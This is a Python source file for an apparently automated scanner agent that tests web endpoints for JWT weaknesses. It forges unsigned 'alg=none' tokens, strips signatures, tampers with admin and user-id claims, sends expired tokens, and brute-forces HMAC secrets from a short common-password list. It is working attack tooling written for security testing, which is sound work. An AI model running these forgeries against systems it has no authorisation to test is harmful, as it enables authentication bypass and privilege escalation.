"""
JWT Security Agent — Tests JWT token weaknesses.

Tests for:
1. Algorithm None (and variants: None, NONE, nOnE) — server accepts unsigned token
2. Empty signature — stripped signature still accepted
3. Claim tampering — role/is_admin/user_id escalation with alg=none
4. Expired token acceptance — server ignores exp claim
5. Key brute force — HMAC-SHA256 with common secrets

Usage — called by DecisionEngine via test_endpoint():
    agent = JWTAgent(llm_backend="ollama")
    findings = agent.test_endpoint(endpoint, config, state)
"""

import base64
import hashlib
import hmac
import json
import time
from urllib.parse import urlparse

import httpx
from rich.console import Console

from agents.base import BaseAgent

console = Console()

# Common secrets to try during brute-force test
COMMON_SECRETS = [
    "secret",
    "password",
    "123456",
    "key",
    "jwt_secret",
    "your-256-bit-secret",
    "changeme",
    "supersecret",
    "mysecret",
    "test",
]

REQUEST_TIMEOUT = 10


# ── JWT helpers ────────────────────────────────────────────────────────────────

def _b64url_decode(segment: str) -> bytes:
    """Base64url-decode a JWT segment, padding as needed."""
    segment = segment.replace("-", "+").replace("_", "/")
    pad = 4 - len(segment) % 4
    if pad != 4:
        segment += "=" * pad
    return base64.b64decode(segment)


def _b64url_encode(data: bytes) -> str:
    """Base64url-encode bytes with no padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str):
    """
    Split a JWT into (header_dict, payload_dict, signature_str).
    Returns (None, None, None) on failure.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None, None, None


def _encode_jwt(header: dict, payload: dict, signature: str = "") -> str:
    """Encode a JWT from dicts, appending the given raw signature segment."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def _sign_hs256(header: dict, payload: dict, secret: str) -> str:
    """Sign a JWT with HMAC-SHA256 and return the full token."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# ── Response comparison ────────────────────────────────────────────────────────

def _is_success_response(resp: httpx.Response) -> bool:
    """Return True if the response looks like the server accepted the token."""
    return resp.status_code < 400


def _responses_similar(baseline: httpx.Response, test_resp: httpx.Response) -> bool:
    """
    Return True when the test response resembles a successful baseline response.
    We consider status-code match and non-error body content as sufficient signal.
    """
    if not _is_success_response(test_resp):
        return False
    # If baseline was also a success response, status codes should match closely
    if _is_success_response(baseline):
        return True
    # Baseline was an error — any success from the tampered token is noteworthy
    return True


def _make_finding(url: str, method: str, payload: str, evidence: str,
                  severity: str = "High") -> dict:
    return {
        "vuln_type": "jwt",
        "url": url,
        "method": method,
        "param_name": "Authorization",
        "payload": payload,
        "evidence": evidence,
        "severity": severity,
        "source": "JWTAgent",
        "validated": True,
    }


# ── Agent ──────────────────────────────────────────────────────────────────────

class JWTAgent(BaseAgent):
    model = "claude-haiku-4-5-20251001"
    max_iterations = 10
    vuln_type = "jwt"
    agent_name = "JWTAgent"
    allowed_tools = ["validate_finding"]

    system_prompt = """You are a JWT security specialist. Test ONLY for JWT vulnerabilities."""

    # ------------------------------------------------------------------
    # Core deterministic test — called by BaseAgent.test_endpoint()
    # ------------------------------------------------------------------

    def _deterministic_test(self, endpoint, config, state) -> list:
        token = getattr(config, "bearer_token", "") or ""
        if not token:
            return []

        header, payload, _ = _decode_jwt(token)
        if header is None:
            console.print("  [dim]JWTAgent: could not decode bearer token — skipping[/]")
            return []

        url = endpoint.url
        method = endpoint.method or "GET"
        auth_headers = {"Authorization": f"Bearer {token}", "User-Agent": "VulnHive-AI/1.0"}

        console.print(f"  [cyan]JWTAgent: testing JWT weaknesses on {url}[/]")

        findings = []

        with httpx.Client(timeout=REQUEST_TIMEOUT, verify=False) as client:
            # Establish baseline with the original token
            baseline = self._send(client, url, method, auth_headers)
            if baseline is None:
                return []

            # Test 1 + 2: Algorithm "none" (and variants)
            findings.extend(
                self._test_alg_none(client, url, method, header, payload, baseline)
            )

            # Test 3: Empty signature
            findings.extend(
                self._test_empty_signature(client, url, method, header, payload, baseline)
            )

            # Test 4: Claim tampering with alg=none
            findings.extend(
                self._test_claim_tampering(client, url, method, header, payload, baseline)
            )

            # Test 5: Expired token acceptance
            findings.extend(
                self._test_expired_token(client, url, method, header, payload, baseline)
            )

            # Test 6: Key brute force
            findings.extend(
                self._test_key_brute_force(client, url, method, header, payload, baseline, config)
            )

        for f in findings:
            console.print(
                f"  [bold red][JWTAgent] CONFIRMED: {f['payload'][:60]} @ {url}[/]"
            )

        return findings

    # ------------------------------------------------------------------
    # Individual test methods
    # ------------------------------------------------------------------

    def _test_alg_none(self, client, url, method, header, payload, baseline) -> list:
        """Test 1 & 2: alg=none / None / NONE / nOnE — unsigned token acceptance."""
        findings = []
        alg_variants = ["none", "None", "NONE", "nOnE"]

        for alg_val in alg_variants:
            tampered_header = dict(header)
            tampered_header["alg"] = alg_val
            token = _encode_jwt(tampered_header, payload, "")  # no signature
            resp = self._send_with_token(client, url, method, token)
            if resp is None:
                continue
            if _responses_similar(baseline, resp):
                findings.append(_make_finding(
                    url=url,
                    method=method,
                    payload=f"alg={alg_val} (unsigned token accepted)",
                    evidence=(
                        f"Server accepted JWT with alg={alg_val!r} and no signature. "
                        f"HTTP {resp.status_code} returned. "
                        "Attacker can forge arbitrary claims without knowing the signing key."
                    ),
                    severity="Critical",
                ))
                break  # one confirmation is enough for alg-none class

        return findings

    def _test_empty_signature(self, client, url, method, header, payload, baseline) -> list:
        """Test 3: Keep original alg, strip signature entirely."""
        findings = []
        # Only meaningful if original alg is NOT none
        if header.get("alg", "").lower() == "none":
            return findings

        token = _encode_jwt(header, payload, "")
        resp = self._send_with_token(client, url, method, token)
        if resp is None:
            return findings
        if _responses_similar(baseline, resp):
            findings.append(_make_finding(
                url=url,
                method=method,
                payload=f"alg={header.get('alg')} with empty signature",
                evidence=(
                    f"Server accepted JWT with original alg={header.get('alg')!r} "
                    f"but empty signature segment. HTTP {resp.status_code} returned. "
                    "Signature verification appears to be skipped."
                ),
                severity="Critical",
            ))
        return findings

    def _test_claim_tampering(self, client, url, method, header, payload, baseline) -> list:
        """Test 4: Modify privilege claims, re-sign with alg=none."""
        findings = []
        privilege_mutations = [
            ("role", "admin"),
            ("is_admin", True),
            ("user_id", "1"),
            ("userId", "1"),
            ("sub", "1"),
            ("scope", "admin"),
            ("group", "admin"),
        ]

        tampered_header = dict(header)
        tampered_header["alg"] = "none"

        for claim_key, claim_val in privilege_mutations:
            if claim_key not in payload and claim_key not in ("role", "is_admin", "user_id"):
                continue

            tampered_payload = dict(payload)
            tampered_payload[claim_key] = claim_val
            token = _encode_jwt(tampered_header, tampered_payload, "")

            resp = self._send_with_token(client, url, method, token)
            if resp is None:
                continue
            if _responses_similar(baseline, resp):
                findings.append(_make_finding(
                    url=url,
                    method=method,
                    payload=f"claim tampering: {claim_key}={claim_val!r} with alg=none",
                    evidence=(
                        f"Server accepted unsigned JWT with tampered claim "
                        f"{claim_key!r}={claim_val!r}. HTTP {resp.status_code} returned. "
                        "Privilege escalation may be possible."
                    ),
                    severity="Critical",
                ))
                break  # one confirmed escalation is sufficient

        return findings

    def _test_expired_token(self, client, url, method, header, payload, baseline) -> list:
        """Test 5: Set exp to past timestamp, verify server still accepts it."""
        findings = []
        if "exp" not in payload:
            return findings  # no exp claim to manipulate

        tampered_payload = dict(payload)
        tampered_payload["exp"] = int(time.time()) - 86400  # 24 hours in the past

        # Re-encode: keep original header, original alg, no sig (alg=none to isolate the exp test)
        tampered_header = dict(header)
        tampered_header["alg"] = "none"
        token = _encode_jwt(tampered_header, tampered_payload, "")

        resp = self._send_with_token(client, url, method, token)
        if resp is None:
            return findings
        if _responses_similar(baseline, resp):
            findings.append(_make_finding(
                url=url,
                method=method,
                payload=f"exp set to past ({tampered_payload['exp']}), alg=none",
                evidence=(
                    f"Server accepted JWT with exp claim in the past "
                    f"(exp={tampered_payload['exp']}). HTTP {resp.status_code} returned. "
                    "Expired token validation appears to be missing or disabled."
                ),
                severity="High",
            ))
        return findings

    def _test_key_brute_force(self, client, url, method, header, payload,
                               baseline, config) -> list:
        """Test 6: Try signing with common secrets using HMAC-SHA256."""
        findings = []
        alg = header.get("alg", "")
        if alg.upper() not in ("HS256", "HS384", "HS512"):
            return findings  # brute-force only applies to HMAC algorithms

        # Build the wordlist: add app domain to defaults
        secrets = list(COMMON_SECRETS)
        try:
            parsed = urlparse(getattr(config, "base_url", "") or url)
            domain = parsed.hostname or ""
            if domain and domain not in secrets:
                secrets.append(domain)
        except Exception:
            pass

        hs256_header = dict(header)
        hs256_header["alg"] = "HS256"  # normalise to HS256 for brute-force

        for secret in secrets:
            token = _sign_hs256(hs256_header, payload, secret)
            resp = self._send_with_token(client, url, method, token)
            if resp is None:
                continue
            if _responses_similar(baseline, resp):
                findings.append(_make_finding(
                    url=url,
                    method=method,
                    payload=f"HS256 signed with weak secret: {secret!r}",
                    evidence=(
                        f"Server accepted JWT signed with weak HMAC-SHA256 secret {secret!r}. "
                        f"HTTP {resp.status_code} returned. "
                        "Attacker can forge arbitrary tokens using this secret."
                    ),
                    severity="Critical",
                ))
                break  # found the key — no need to continue

        return findings

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _send(client: httpx.Client, url: str, method: str, headers: dict):
        """Send a request and return the response, or None on error."""
        try:
            if method.upper() == "POST":
                return client.post(url, headers=headers)
            return client.get(url, headers=headers)
        except Exception:
            return None

    @staticmethod
    def _send_with_token(client: httpx.Client, url: str, method: str, token: str):
        """Send a request with a custom Bearer token."""
        headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "VulnHive-AI/1.0",
        }
        try:
            if method.upper() == "POST":
                return client.post(url, headers=headers)
            return client.get(url, headers=headers)
        except Exception:
            return None
